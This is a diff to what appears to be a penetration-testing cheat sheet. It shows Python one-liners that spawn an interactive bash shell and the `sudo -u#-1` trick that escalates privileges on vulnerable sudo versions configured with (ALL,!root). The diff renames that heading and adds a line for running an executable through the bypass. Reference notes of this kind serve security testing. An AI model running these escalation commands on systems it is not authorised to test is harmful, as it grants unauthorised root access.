@@ -11,8 +11,9 @@
 * python -c 'import pty;pty.spawn("/bin/bash")'
 * python3 -c 'import pty;pty.spawn("/bin/bash")'
 
-### Vulnerable sudo version
+### Vulnerable sudo (ALL,!root)
 `sudo -u#-1 whoami`
+`sudo -u#-1 <path_of_executable_as_other_user>`
 
 ### Execute as diffent user
 `sudo -u <user> <command>`
